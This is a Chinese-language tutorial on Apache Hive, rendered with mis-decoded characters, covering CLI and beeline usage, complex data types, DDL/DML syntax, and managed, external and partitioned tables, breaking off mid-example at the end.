ä½¿ç”¨åœºæ™¯: èµ·åˆ«åhive -d name=zhangsan #ä¼ å‚&gt; create table t2(name string,$&#123;name&#125; string); #å–å‚æ•°&gt; desc t2;---name stringzhangsan string hiveconf : 12345678910# æ˜¾ç¤ºå½“å‰æ•°æ®åº“åç§°[ap@cs2]~% hive --hiveconf hive.cli.print.current.db=true;hive (default)&gt; create database mydb;hive (default)&gt; use mydb;hive (mydb)&gt; # æ˜¾ç¤ºè¡¨å¤´(å­—æ®µå)hive --hiveconf hive.cli.print.header=true;select * from t2;t2.name t2.zhangsan 1.7 Hive çš„è„šæœ¬æ‰§è¡Œ Hive -e â€œxx â€ e å°±æ˜¯ edit, åœ¨ç»ˆç«¯æ‰“å°è¾“å‡º Hive -e â€œshow tablesâ€ &gt;&gt; a.txt å¯ä»¥æŠŠæ‰§è¡Œç»“æœé‡å®šå‘åˆ°æ–‡ä»¶ä¸­ Hive -S -e â€œshow tablesâ€ &gt;&gt; a.txt -S : silence å®‰é™çš„æ‰§è¡Œ hive -f file hive -f hql , hql æ˜¯æ–‡ä»¶, æ‰§è¡Œæ–‡ä»¶ æ‰§è¡Œå®Œäº†ä¹‹å, å°±ç¦»å¼€ hive å‘½ä»¤è¡Œ hive -i /home/ap/hive-init.sql æ‰§è¡Œå®Œäº†,è¿˜åœ¨æ§åˆ¶å°, å¯ä»¥ç»§ç»­æ“ä½œ hive&gt;source file source + æ–‡ä»¶å : ç›´æ¥æ‰§è¡Œå½“å‰ç›®å½•æ–‡ä»¶ source /home/ap/xx.sql; 1.8 hiveä¸ä¾èµ–ç¯å¢ƒçš„äº¤äº’ ä¸linuxäº¤äº’å‘½ä»¤ ï¼ !ls !pwd ä¸hdfsäº¤äº’å‘½ä»¤ dfs -ls / dfs -mkdir /hive hive (default)&gt; dfs -rm -r /user/hive/warehouse/t5; beeline ä¸ linux &amp; hdfs äº¤äº’ !help æŸ¥çœ‹å¸®åŠ© 1.9 Hive çš„ JDBC æ¨¡å¼ JAVA APIäº¤äº’æ‰§è¡Œæ–¹å¼ hive è¿œç¨‹æœåŠ¡ (ç«¯å£å·1000 0) å¯åŠ¨æ–¹å¼ hive --service hiveserver2 org.apache.hive.jdbc.HiveDriver åœ¨javaä»£ç ä¸­è°ƒç”¨hiveçš„JDBCå»ºç«‹è¿æ¥ ç”¨ beeline è¿æ¥ æ–¹å¼1: ç›´æ¥ç™»å½• æ³¨æ„: è¿™é‡Œçš„cs2æ˜¯æŒ‡çš„æ•°æ®åº“æ‰€åœ¨çš„æœåŠ¡å™¨, å¦‚æœmysql å®‰è£…åœ¨ cs2ä¸Š, é‚£ä¹ˆä¸ç®¡åœ¨å“ªå°æœºå™¨ä¸Šç™»å½•beeline , éƒ½è¿™æ ·è¾“å…¥å°±è¡Œäº† beeline -u jdbc:hive2://cs2:10000 -n ap æ–¹å¼2: è¾“å…¥ç”¨æˆ·åå¯†ç ç™»å½• !connect jdbc:hive2://cs2:10000 beelineæ³¨æ„ç‚¹: ä½¿ç”¨ beeline è¿æ¥æ—¶, è²Œä¼¼æ— æ³•ä¸ Linux ç›®å½•äº¤äº’ å½“å‰ç›®å½•åœ¨/home/ap/apps/apache-hive-2.3.2-bin/bin/ä¸‹ è¦ä¼ æ–‡ä»¶çš„è¯, è¦ä½¿ç”¨å…¨è·¯å¾„ 1.10 SETå‘½ä»¤ä½¿ç”¨ Hive æ§åˆ¶å°set å‘½ä»¤ set; set -v; æ˜¾ç¤ºæ‰€æœ‰çš„ç¯å¢ƒå˜é‡ set hive.cli.print.current.db=true; set hive.cli.print.header=true; set hive.metastore.warehouse.dir=/hive; hiveå‚æ•°åˆå§‹åŒ–é…ç½®setå‘½ä»¤: ~/.hiverc åˆ›å»ºæ­¤æ–‡ä»¶, åœ¨æ­¤æ–‡ä»¶ä¸­é…ç½®åˆå§‹åŒ–å‘½ä»¤ è¡¥å……ï¼šhiveå†å²æ“ä½œå‘½ä»¤é›†~/.hivehistory 2. Hiveæ•°æ®ç±»å‹2.1 åŸºæœ¬æ•°æ®ç±»å‹ 2.2 å¤åˆæ•°æ®ç±»å‹ åˆ›å»ºå­¦ç”Ÿè¡¨ 123456CREATE TABLE student( id INT, name STRING, favors ARRAY\&lt;STRING&gt;, scores MAP&lt;STRING, FLOAT&gt;); é»˜è®¤åˆ†éš”ç¬¦ æè¿° è¯­å¥ \n åˆ†éš”è¡Œ LINES TERMINATED BY â€˜\tâ€™ ^A åˆ†éš”å­—æ®µ(åˆ—)ï¼Œæ˜¾ç¤ºç¼–ç ä½¿ç”¨\001 FIELDS TERMINATED BY â€˜\001â€™ ^B åˆ†éš”å¤åˆç±»å‹ä¸­çš„å…ƒç´ ï¼Œæ˜¾ç¤ºç¼–ç ä½¿ç”¨\002 COLLECTION ITEMS TERMINATED BY â€˜\002â€™ ^C åˆ†éš”mapå…ƒç´ çš„keyå’Œvalueï¼Œæ˜¾ç¤ºç¼–ç ä½¿ç”¨\003 MAP KEYS TERMINATED BY â€˜\003â€™ 2.2.1. Struct ä½¿ç”¨Structså†…éƒ¨çš„æ•°æ®å¯ä»¥é€šè¿‡DOTï¼ˆ.ï¼‰æ¥å­˜å–ï¼Œä¾‹å¦‚ï¼Œè¡¨ä¸­ä¸€åˆ—cçš„ç±»å‹ä¸ºSTRUCT{a INT; b INT}ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡c.aæ¥è®¿é—®åŸŸa 123456789101112131415161718192021222324252627282930# æ•°æ®1001,zhangsan:241002,lisi:281003,wangwu:25# 1.åˆ›å»ºè¡¨hive&gt; create table student_test(id INT, info struct&lt;name:STRING, age:INT&gt;)ROW FORMAT DELIMITED FIELDS TERMINATED BY ','COLLECTION ITEMS TERMINATED BY ':';# 2.åŠ è½½è¡¨hive&gt; load data local inpath "student_test" into table student_test;# 3.é¡ºä¾¿è®¾ç½® æ˜¾ç¤ºè¡¨å¤´,å’Œå½“å‰æ•°æ®åº“hive&gt; set hive.cli.print.header=true;hive&gt; set hive.cli.print.current.db=true;# 4. å±•ç¤ºæ‰€æœ‰çš„hive (default)&gt; select * from student_test;---student_test.id student_test.info1001 &#123;"name":"zhangsan","age":24&#125;1002 &#123;"name":"lisi","age":28&#125;1003 &#123;"name":"wangwu","age":25&#125;---# Struct -ç»“æ„ä½“-ä½¿ç”¨ . hive (default)&gt; select id,info.name,info.age from student_test;id name age1001 zhangsan 241002 lisi 281003 wangwu 25 2.2.2. Array ä½¿ç”¨Arrayä¸­çš„æ•°æ®ä¸ºç›¸åŒç±»å‹ï¼Œä¾‹å¦‚ï¼Œå‡å¦‚array Aä¸­å…ƒç´ [&#39;a&#39;,&#39;b&#39;,&#39;câ€™]ï¼Œåˆ™A[1]çš„å€¼ä¸ºâ€™bâ€™ 123456789101112131415161718192021222324# åŸå§‹æ•°æ®zhangsan,24:25:27:37lisi,28:39:23:43wangwu,25:23:02:54# åˆ›å»ºè¡¨hive (default)&gt; create table class_test(name string,student_id_list array&lt;int&gt;) row format delimited fields terminated by ',' collection items terminated by ':';# åŠ è½½è¡¨hive (default)&gt; load data local inpath "class_test" into table class_test;# æŸ¥çœ‹è¡¨hive (default)&gt; select * from class_test;OKclass_test.name class_test.student_id_listzhangsan [24,25,27,37]lisi [28,39,23,43]wangwu [25,23,2,54]# æŸ¥çœ‹æ•°æ®ä¸­æŸä¸ªå…ƒç´ hive (default)&gt; select name, student_id_list[0] from class_test where name='zhangsan';OKname _c1zhangsan 24 2.2.3. Map ä½¿ç”¨è®¿é—®æŒ‡å®šåŸŸå¯ä»¥é€šè¿‡[â€œæŒ‡å®šåŸŸåç§°â€]è¿›è¡Œï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªMap MåŒ…å«äº†ä¸€ä¸ªgroup-&gt;gidçš„kvå¯¹ï¼Œgidçš„å€¼å¯ä»¥é€šè¿‡M[â€˜groupâ€™]æ¥è·å– 1234567891011121314151617181920212223242526272829303132333435# åŸå§‹æ•°æ®1001 job:80,team:60,person:701002 job:60,team:80,person:801003 job:90,team:70,person:100# åˆ›å»ºè¡¨hive (default)&gt; create table employee(id string,perf map&lt;string,int&gt;) row format delimited fields terminated by '\t' collection items terminated by ',' map keys terminated by ':';# å¯¼å…¥hive (default)&gt; load data local inpath "employee_data" into table employee;# æŸ¥çœ‹hive (default)&gt; select * from employee;---employee.id employee.perf1001 &#123;"job":80,"team":60,"person":70&#125;1002 &#123;"job":60,"team":80,"person":80&#125;1003 &#123;"job":90,"team":70,"person":100&#125;Time taken: 0.228 seconds, Fetched: 3 row(s)# æŸ¥çœ‹å•ä¸ªhive (default)&gt; select id,perf['job'],perf['team'],perf['person'] from employee;OKid _c1 _c2 _c31001 80 60 701002 60 80 801003 90 70 100# æ˜¾ç¤ºåˆ«åhive (default)&gt; select id,perf['job'] as job,perf['team'] as team,perf['person'] as person from employee;OKid job team person1001 80 60 701002 60 80 801003 90 70 100 3. DDL , DML3.1 DDL3.1.1 æ•°æ®åº“å®šä¹‰ é»˜è®¤æ•°æ®åº“â€defaultâ€ ä½¿ç”¨æŸä¸ªæ•°æ®åº“ use &lt;æ•°æ®åº“å&gt; åˆ›å»ºä¸€ä¸ªæ–°åº“ 12345678CREATE DATABASE [IF NOT EXISTS] mydb [LOCATION] '/.......' [COMMENT] '....â€™;hive&gt;SHOW DATABASES;hive&gt;DESCRIBE DATABASE [extended] mydb;hive&gt;DROP DATABASE [IF EXISTS] mydb [CASCADE]; åˆ›å»º create database db1; åˆ é™¤ drop database if exists db1; çº§è”åˆ é™¤ drop database if exists db1 cascade; 3.1.2 è¡¨å®šä¹‰/ä¿®æ”¹ åˆ›å»ºè¡¨ hive&gt;CREATE TABLE IF NOT EXISTS t1(â€¦) [COMMENT â€˜â€¦.â€™] [LOCATION â€˜â€¦â€™] hive (default)&gt; create table t4(name string,age int) row format delimited fields terminated by &quot;\tâ€; hive&gt; SHOW TABLES in mydb; show tables in mydb â€˜â€™class*â€œ : æŸ¥çœ‹ä»¥ mydb åº“ä¸­, ä»¥ class å¼€å¤´çš„è¡¨ hive&gt;CREATE TABLE t2 LIKE t1; å¤åˆ¶è¡¨ åªä¼šå¤åˆ¶è¡¨ç»“æ„ hive (default)&gt; create table t2 like t1; hive (mydb)&gt; create table t3 like default.employee; å¤åˆ¶å…¶å®ƒåº“çš„è¡¨ hive&gt;DESCRIBE t2; desc t2; # æ•ˆæœä¸€æ ·çš„ desc extended t1; # æŸ¥çœ‹æ›´è¯¦ç»†çš„è¡¨ä¿¡æ¯ hive (default)&gt; desc formatted t1; # æ ¼å¼åŒ–æŸ¥çœ‹è¡¨çš„è¯¦ç»†ä¿¡æ¯ drop table xxx; åˆ é™¤è¡¨ æŸ¥çœ‹å»ºè¡¨è¯­å¥ show create table t_table; ä¿®æ”¹è¡¨ é‡å‘½åè¡¨ ALTER TABLE table_name RENAME TO new_table_name å¢åŠ /åˆ é™¤ åˆ†åŒº alter table student_p add partition(part=&#39;a&#39;) partition(part=&#39;b&#39;); ä¸¤ä¸ª partitionä¸­æ²¡æœ‰â€™,â€™ alter table student drop partition(stat_data=â€˜ffffâ€™), partition(part=â€˜aâ€™),partiton(part=â€˜bâ€™); ä¸¤ä¸ª partitionä¸­æœ‰â€™,â€™ å¢åŠ /æ›´æ–° åˆ— ALTER TABLE table_name ADD|REPLACE COLUMNS (col_name data_type [COMMENT col_comment], ...) æ³¨ï¼šADDæ˜¯ä»£è¡¨æ–°å¢ä¸€å­—æ®µï¼Œå­—æ®µä½ç½®åœ¨æ‰€æœ‰åˆ—åé¢(partitionåˆ—å‰)ï¼ŒREPLACEåˆ™æ˜¯è¡¨ç¤ºæ›¿æ¢è¡¨ä¸­æ‰€æœ‰å­—æ®µã€‚ alter table student add columns (name1 string); ALTER TABLE table_name CHANGE c_name new_c_name new_c_type [FIRST | AFTER c_name] 3.1.3 åˆ—å®šä¹‰ ä¿®æ”¹åˆ—çš„åç§°ã€ç±»å‹ã€ä½ç½®ã€æ³¨é‡Š ALTER TABLE t3 CHANGE COLUMN old_name new_name String COMMENT &#39;...&#39; AFTER column2; 123456789# ä¿®æ”¹åˆ—åhive (default)&gt; alter table t1 change column name username string comment 'new name';# æŸ¥çœ‹è¡¨hive (default)&gt; desc t1;---col_name data_type commentusername string new nameage int--- å¢åŠ åˆ— hive&gt; ALTER TABLE t3 ADD COLUMNS(gender int); 1234567891011121314# æŸ¥çœ‹è¡¨ç»“æ„hive (default)&gt; desc t3;---col_name data_type commentname string---# æ·»åŠ åˆ—hive (default)&gt; alter table t3 add columns(gender int);---hive (default)&gt; desc t3;---col_name data_type commentname stringgender int åˆ é™¤åˆ— replace éå¸¸ä¸å»ºè®®ä½¿ç”¨, ä¼šé€ æˆæ•°æ®é”™ä¹±, ä¸€èˆ¬é‡‡å–é‡æ–°åˆ›å»ºä¸€å¼ è¡¨çš„æ–¹å¼. 3.1.4 æ˜¾ç¤ºå‘½ä»¤ show tables show databases show partitions show functions desc extended t_name; desc formatted table_name; 3.2 DML3.2.1 Load è¯­æ³•ç»“æ„ LOAD DATA [LOCAL] INPATH &#39;filepath&#39; [OVERWRITE] INTO TABLE tablename [PARTITION (partcol1=val1, partcol2=val2 ...)] è¯´æ˜ï¼š Load æ“ä½œåªæ˜¯å•çº¯çš„å¤åˆ¶/ç§»åŠ¨æ“ä½œï¼Œå°†æ•°æ®æ–‡ä»¶ç§»åŠ¨åˆ° Hive è¡¨å¯¹åº”çš„ä½ç½®ã€‚ filepathï¼š ç›¸å¯¹è·¯å¾„ï¼Œä¾‹å¦‚ï¼šproject/data1 ç»å¯¹è·¯å¾„ï¼Œä¾‹å¦‚ï¼š/user/hive/project/data1 åŒ…å«æ¨¡å¼çš„å®Œæ•´ URIï¼Œä¾‹å¦‚ï¼š hdfs://namenode:9000/user/hive/project/data1 LOCALå…³é”®å­— å¦‚æœæŒ‡å®šäº† LOCALï¼Œ load å‘½ä»¤ä¼šå»æŸ¥æ‰¾æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„ filepathã€‚ å¦‚æœæ²¡æœ‰æŒ‡å®š LOCAL å…³é”®å­—ï¼Œåˆ™æ ¹æ®inpathä¸­çš„uriæŸ¥æ‰¾æ–‡ä»¶ OVERWRITE å…³é”®å­— å¦‚æœä½¿ç”¨äº† OVERWRITE å…³é”®å­—ï¼Œåˆ™ç›®æ ‡è¡¨ï¼ˆæˆ–è€…åˆ†åŒºï¼‰ä¸­çš„å†…å®¹ä¼šè¢«åˆ é™¤ï¼Œç„¶åå†å°† filepath æŒ‡å‘çš„æ–‡ä»¶/ç›®å½•ä¸­çš„å†…å®¹æ·»åŠ åˆ°è¡¨/åˆ†åŒºä¸­ã€‚ å¦‚æœç›®æ ‡è¡¨ï¼ˆåˆ†åŒºï¼‰å·²ç»æœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æ–‡ä»¶åå’Œ filepath ä¸­çš„æ–‡ä»¶åå†²çªï¼Œé‚£ä¹ˆç°æœ‰çš„æ–‡ä»¶ä¼šè¢«æ–°æ–‡ä»¶æ‰€æ›¿ä»£ã€‚ 3.2.2 Insertè¯­æ³•ç»“æ„ æ™®é€šæ’å…¥ INSERT OVERWRITE TABLE tablename1 [PARTITION (partcol1=val1, partcol2=val2 â€¦)] select_statement1 FROM from_statement Multiple inserts: 12345678910FROM from_statement [INSERT OVERWRITE TABLE tablename1 [PARTITION (partcol1=val1, partcol2=val2 ...)] select_statement1 ][INSERT OVERWRITE TABLE tablename2 [PARTITION ...] select_statement2] ...# å¤šé‡æ’å…¥ä¸¾ä¾‹from studentinsert into table student_p partition(part='a')select * where id&lt;95011insert into table student_p partition(part='b')select * where id&gt;95011; Dynamic partition inserts: ä¸æŒ‡å®šåˆ†åŒºå­—æ®µ, æŒ‰ç…§ from è¡¨çš„åˆ†åŒºå­—æ®µæ’å…¥ INSERT OVERWRITE TABLE tablename PARTITION (partcol1, partcol2 ...) select_statement FROM from_statement å¯¼å‡ºè¡¨æ•°æ®è¯­æ³•ç»“æ„ INSERT OVERWRITE [LOCAL] DIRECTORY directory1 SELECT ... FROM ... 123456789101112131415# å¯¼å‡ºåˆ°æœ¬åœ°insert overwrite local directory '/home/ap/test/stucent1'select * from student1;--------------------ä¾‹å­:'æŸ¥è¯¢å­¦ç”Ÿä¿¡æ¯ï¼ŒæŒ‰æ€§åˆ«åˆ†åŒºï¼Œåœ¨åˆ†åŒºå†…æŒ‰å¹´é¾„æœ‰åº'0: jdbc:hive2://cs2:10000&gt; set mapred.reduce.tasks=2;No rows affected (0.015 seconds)0: jdbc:hive2://cs2:10000&gt; insert overwrite local directory '/home/ap/ihiveout'. . . . . . . . . . . . .&gt; select * from student distribute by Sex sort by Sage;--------------------# å¯¼å‡ºåˆ° HDFS (ä»…ä»…æ˜¯å°‘äº†ä¸€ä¸ª local)insert overwrite directory '/test/stucent1'select * from student1; multiple inserts: 123FROM from_statementINSERT OVERWRITE [LOCAL] DIRECTORY directory1 select_statement1[INSERT OVERWRITE [LOCAL] DIRECTORY directory2 select_statement2] ... 4. Hiveçš„æ•°æ®æ¨¡å‹4.1 ç®¡ç†è¡¨ - åˆç§°ä¸ºå†…éƒ¨è¡¨, å—æ§è¡¨åŸºæœ¬æ“ä½œ åˆ›å»ºæ•°æ®æ–‡ä»¶inner_table.dat åˆ›å»ºè¡¨ hive&gt;create table inner_table (key string); åŠ è½½æ•°æ® åŠ è½½æœ¬åœ°æ•°æ® hive&gt;load data local inpath &#39;/root/inner_table.dat&#39; into table inner_table; åŠ è½½HDFS ä¸Šæ•°æ® hive&gt;load data inpath â€˜xxxâ€™ into table xxx; åŒºåˆ« åŠ è½½ hdfs ä¸Šçš„æ•°æ®æ²¡æœ‰ local åŠ è½½æœ¬åœ°æ•°æ®æ˜¯ copy ä¸€ä»½, åŠ è½½ hdfs ä¸Šçš„æ•°æ®æ˜¯ç›´æ¥ç§»åŠ¨æ•°æ®åˆ°åŠ è½½çš„è¡¨ç›®å½•ä¸‹â€“ mv æŸ¥çœ‹æ•°æ® select * from inner_table select count(*) from inner_table åˆ é™¤è¡¨ drop table inner_table æ¸…ç©ºè¡¨ truncate table table_name; æ³¨æ„: å¦‚æœåˆ›å»ºè¡¨çš„æ—¶å€™, åªæŒ‡å®šäº†ç›®å½•, æ²¡æœ‰æŒ‡å®šè¡¨å, åˆ é™¤è¡¨çš„æ—¶å€™, ä¼šæŠŠè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰è¡¨å…¨éƒ¨åˆ æ‰ hive (mydb)&gt; create table t2(id int)location &#39;/home/t2&#39;; å†…éƒ¨è¡¨è§£é‡Š ç®¡ç†è¡¨ï¼Œä¹Ÿç§°ä½œå†…éƒ¨è¡¨,å—æ§è¡¨ æ‰€æœ‰çš„ Table æ•°æ®ï¼ˆä¸åŒ…æ‹¬ External Tableï¼‰éƒ½ä¿å­˜åœ¨warehouseè¿™ä¸ªç›®å½•ä¸­ã€‚ åˆ é™¤è¡¨æ—¶ï¼Œå…ƒæ•°æ®ä¸æ•°æ®éƒ½ä¼šè¢«åˆ é™¤ åˆ›å»ºè¿‡ç¨‹å’Œæ•°æ®åŠ è½½è¿‡ç¨‹ï¼ˆè¿™ä¸¤ä¸ªè¿‡ç¨‹å¯ä»¥åœ¨åŒä¸€ä¸ªè¯­å¥ä¸­å®Œæˆï¼‰ï¼Œåœ¨åŠ è½½æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå®é™…æ•°æ®ä¼šè¢«ç§»åŠ¨åˆ°æ•°æ®ä»“åº“ç›®å½•ä¸­ï¼›ä¹‹åå¯¹æ•°æ®å¯¹è®¿é—®å°†ä¼šç›´æ¥åœ¨æ•°æ®ä»“åº“ç›®å½•ä¸­å®Œæˆã€‚åˆ é™¤è¡¨æ—¶ï¼Œè¡¨ä¸­çš„æ•°æ®å’Œå…ƒæ•°æ®å°†ä¼šè¢«åŒæ—¶åˆ é™¤ å†…éƒ¨è¡¨è½¬ä¸ºå¤–éƒ¨è¡¨, å¤–éƒ¨è¡¨è½¬ä¸ºå†…éƒ¨è¡¨ 123456789101112131415161718192021222324252627hive (mydb)&gt; create table t1(id int);# manage_table è½¬æ¢ä¸º å¤–éƒ¨è¡¨ external_table ## æ³¨æ„: ä¿®æ”¹ä¸ºå¤–éƒ¨è¡¨æ—¶, åé¢2ä¸ªéƒ½è¦å¤§å†™hive (mydb)&gt; alter table t1 set tblproperties('EXTERNAL'='TRUE');## ä¿®æ”¹ä¸ºå†…éƒ¨è¡¨hive (mydb)&gt; alter table t1 set tblproperties('EXTERNAL'='FALSE');# æŸ¥çœ‹t1è¯¦ç»†ä¿¡æ¯desc formatted t1;---Location: hdfs://cs1:9000/user/hive/warehouse/mydb.db/t1Table Type: EXTERNAL_TABLE-- # åˆ é™¤t1hive (mydb)&gt; drop table t1;# æ­¤æ—¶å†æŸ¥çœ‹, å·²ç»æ²¡äº†hive (mydb)&gt; show tables;OKtab_name# ä½†æ˜¯æŸ¥çœ‹hdfs è·¯å¾„ä¼šå‘ç°è¿˜åœ¨, å› ä¸ºæ­¤è¡¨ç°åœ¨å·²ç»æ˜¯å¤–éƒ¨è¡¨, åˆ é™¤ä¸ä¼šåˆ é™¤æ•°æ®dfs -ls /user/hive/warehouse/mydb.db/t1# å¦‚æœæ­¤æ—¶å†åˆ›å»ºä¸€ä¸ªæ–°è¡¨ t1, è¡¨ç»“æ„ä¸€æ ·, åˆ™æ•°æ®ä¼šè‡ªåŠ¨åŠ è½½ 4.2 â€» å¤–éƒ¨è¡¨4.2.1åŸºæœ¬æ“ä½œ åˆ›å»ºæ•°æ®æ–‡ä»¶external_table.dat åˆ›å»ºè¡¨ hive&gt;create external table external_table1 (key string) ROW FORMAT DELIMITED FIELDS TERMINATED BY &#39;\t&#39; location &#39;/home/externalâ€™; åœ¨HDFSåˆ›å»ºç›®å½•/home/external #hadoop fs -put /home/external_table.dat /home/external åœ¨å·¥ä½œä¸­, ä¸€èˆ¬éƒ½è¿™æ ·ä½¿ç”¨, æŠŠæ•°æ®ä¸Šä¼ åˆ° hdfs ä¸­ åŠ è½½æ•°æ® LOAD DATA &#39;/home/external_table1.dat&#39; INTO TABLE external_table1; æŸ¥çœ‹æ•°æ® select * from external_table select count(*) from external_table åˆ é™¤è¡¨ drop table external_table 4.2.2 å¤–éƒ¨è¡¨è§£é‡Š åŒ…å«External çš„è¡¨å«å¤–éƒ¨è¡¨ åˆ é™¤å¤–éƒ¨è¡¨åªåˆ é™¤metastoreçš„å…ƒæ•°æ®ï¼Œä¸åˆ é™¤hdfsä¸­çš„è¡¨æ•°æ® å¤–éƒ¨è¡¨ åªæœ‰ä¸€ä¸ªè¿‡ç¨‹ï¼ŒåŠ è½½æ•°æ®å’Œåˆ›å»ºè¡¨åŒæ—¶å®Œæˆï¼Œå¹¶ä¸ä¼šç§»åŠ¨åˆ°æ•°æ®ä»“åº“ç›®å½•ä¸­ï¼Œåªæ˜¯ä¸å¤–éƒ¨æ•°æ®å»ºç«‹ä¸€ä¸ªé“¾æ¥ã€‚å½“åˆ é™¤ä¸€ä¸ª å¤–éƒ¨è¡¨ æ—¶ï¼Œä»…åˆ é™¤è¯¥é“¾æ¥ æŒ‡å‘å·²ç»åœ¨ HDFS ä¸­å­˜åœ¨çš„æ•°æ®ï¼Œå¯ä»¥åˆ›å»º Partition å®ƒå’Œ å†…éƒ¨è¡¨ åœ¨å…ƒæ•°æ®çš„ç»„ç»‡ä¸Šæ˜¯ç›¸åŒçš„ï¼Œè€Œå®é™…æ•°æ®çš„å­˜å‚¨åˆ™æœ‰è¾ƒå¤§çš„å·®å¼‚ 4.2.3 å¤–éƒ¨è¡¨è¯­æ³•123456789101112CREATE EXTERNAL TABLE page_view( viewTime INT, userid BIGINT, page_url STRING, referrer_url STRING, ip STRING COMMENT 'IP Address of the User', country STRING COMMENT 'country of originationâ€˜) COMMENT 'This is the staging page view table' ROW FORMAT DELIMITED FIELDS TERMINATED BY '\t' LINES TERMINATED BY '\n' STORED AS TEXTFILE LOCATION 'hdfs://centos:9000/user/data/staging/page_view'; 4.2.4å¤–éƒ¨è¡¨æ³¨æ„ç‚¹: å…ˆåˆ›å»ºå¤–éƒ¨è¡¨/å†…éƒ¨è¡¨, è¡¨åä¸ºt3, å†å¾€t3ä¼ å¯¹åº”å­—æ®µçš„æ•°æ®, å°±å¯ä»¥ç›´æ¥ select æ•°æ®äº† åˆ é™¤å¤–éƒ¨è¡¨ä¹‹å, åŸæœ¬æ•°æ®ä¸ä¼šåˆ é™¤, æ­¤æ—¶åœ¨ç›¸åŒçš„çˆ¶è·¯å¾„åˆ›å»ºä¸è¢«åˆ é™¤è¡¨å­—æ®µç›¸åŒ&amp;åç§°ç›¸åŒçš„å†…éƒ¨/å¤–éƒ¨è¡¨, æ•°æ®ä¹Ÿä¼šç›´æ¥åŠ è½½ å†çœ‹ä¸€ä¸ªæ“ä½œ 12345678910# åœ¨ mydb.db åº“ä¸‹åˆ›å»ºä¸€ä¸ªå¤–éƒ¨è¡¨ t5, æŒ‡å®šè·¯å¾„ä¸º '/external/t5'# æ­¤æ—¶åœ¨ mydb.db åº“çš„è·¯å¾„ä¸‹æ˜¯ä¸å­˜åœ¨ t5è¡¨çš„, è€Œæ˜¯å­˜åœ¨ '/external/t5' ä¸­# ä½†æ˜¯ä½¿ç”¨ 'show tables' æ˜¯å­˜åœ¨ t5 çš„hive (mydb)&gt; create external table t5(id int) location '/external/t5';# å¾€æ­¤ç›®å½•ä¼ æ•°æ®, æ³¨æ„: æ­¤æ—¶ä¼ è¿‡å», intdata æ•°æ®å­˜åœ¨ t5ç›®å½•ä¸‹[ap@cs2]~% hadoop fs -put intdata /external/t5[ap@cs2]~% hadoop fs -put intdata /external/t5/i2# ç»§ç»­ä¼ æ•°æ®, æŸ¥è¯¢çš„æ—¶å€™, å°±æ˜¯ä¼ çš„å…¨éƒ¨æ•°æ®'ç›¸å½“äºæ‰€æœ‰çš„æ•°æ®éƒ½åœ¨ t5è¡¨ä¸­'[ap@cs2]~% hadoop fs -put intdata /external/t5# æ³¨æ„: å¦‚æœä¼ åˆ° t5 ç›®å½•ä¸‹, æ²¡æœ‰æŒ‡å®šæ•°æ®æ–‡ä»¶åçš„è¯, ä¼šé»˜è®¤é‡‡ç”¨æ•°æ®çš„åç§°æ–‡ä»¶. 4.3 â€» åˆ†åŒºè¡¨4.3.1 åŸºæœ¬æ¦‚å¿µå’Œæ“ä½œ åˆ†åŒºå¯ä»¥ç†è§£ä¸ºåˆ†ç±»ï¼Œé€šè¿‡åˆ†ç±»æŠŠä¸åŒç±»å‹çš„æ•°æ®æ”¾åˆ°ä¸åŒçš„ç›®å½•ä¸‹ã€‚ åˆ†ç±»çš„æ ‡å‡†å°±æ˜¯åˆ†åŒºå­—æ®µï¼Œå¯ä»¥ä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥å¤šä¸ªã€‚ åˆ†åŒºè¡¨çš„æ„ä¹‰åœ¨äºä¼˜åŒ–æŸ¥è¯¢ã€‚æŸ¥è¯¢æ—¶å°½é‡åˆ©ç”¨åˆ†åŒºå­—æ®µã€‚å¦‚æœä¸ä½¿ç”¨åˆ†åŒºå­—æ®µï¼Œå°±ä¼šå…¨éƒ¨æ‰«æã€‚ åˆ›å»ºåˆ†åŒºè¡¨, æŒ‡å®šåˆ†åŒºå­—æ®µ hive&gt;CREATE TABLE t3(...) PARTITIONED BY (province string); åˆ›å»ºè¡¨çš„æ—¶å€™, æŒ‡å®šåˆ†åŒºå­—æ®µ keyprovince ä¸ºåˆ†åŒºå­—æ®µæ·»åŠ ä¸€ä¸ªå€¼ hive&gt;ALTER TABLE t3 ADD [IF NOT EXISTS] PARTITION(...) LOCATION &#39;...â€™; alter table t3 add if not exists partition(province=&#39;hubei&#39;) partition(province=&#39;shanghai&#39;); alter table t3 add if not exists partition(province=&#39;jiangsu&#39;); å¯ä¸ºæ­¤åˆ†åŒºå­—æ®µæ·»åŠ å¤šä¸ªå€¼, ä¸º province æ·»åŠ  hubei, hunanâ€¦. æŸ¥çœ‹è¡¨çš„åˆ†åŒºå­—æ®µ&amp;å€¼ hive&gt;SHOW PARTITIONS t3 [partition (province=&#39;beijing&#39;)]; åˆ é™¤åˆ†åŒº hive&gt;ALTER TABLE t3 DROP PARTITION(province=â€˜beijingâ€™.); è¿™é‡Œæ˜¯åˆ é™¤åŒ—äº¬çš„åˆ†åŒº (å¦‚æœæ˜¯å†…éƒ¨è¡¨, ä¼šè¿æ•°æ®ä¸€èµ·åˆ é™¤) è®¾ç½®è¡¨ä¸èƒ½è¢«åˆ é™¤/æŸ¥è¯¢ â€”â€”â€“ è¿™é‡ŒæŠ¥è¯­æ³•é”™è¯¯, :TODO é˜²æ­¢åˆ†åŒºè¢«åˆ é™¤:alter table student_p partition (part=&#39;aa&#39;) enable no_drop; é˜²æ­¢åˆ†åŒºè¢«æŸ¥è¯¢:alter table student_p partition (part=&#39;aa&#39;) enable offline; enable å’Œ disable æ˜¯åå‘æ“ä½œ å…¶å®ƒä¸€äº›ç›¸å…³å‘½ä»¤ SHOW TABLES; # æŸ¥çœ‹æ‰€æœ‰çš„è¡¨ SHOW TABLES â€˜TMPâ€˜; #æ”¯æŒæ¨¡ç³ŠæŸ¥è¯¢ SHOW PARTITIONS TMP_TABLE; #æŸ¥çœ‹è¡¨æœ‰å“ªäº›åˆ†åŒº DESC TMP_TABLE; #æŸ¥çœ‹è¡¨ç»“æ„ 4.3.2 åˆ›å»ºåˆ†åŒºè¡¨å®Œæ•´è¯­æ³•1234567891011CREATE TABLE tmp_table #è¡¨å(title string, # å­—æ®µåç§° å­—æ®µç±»å‹minimum_bid double,quantity 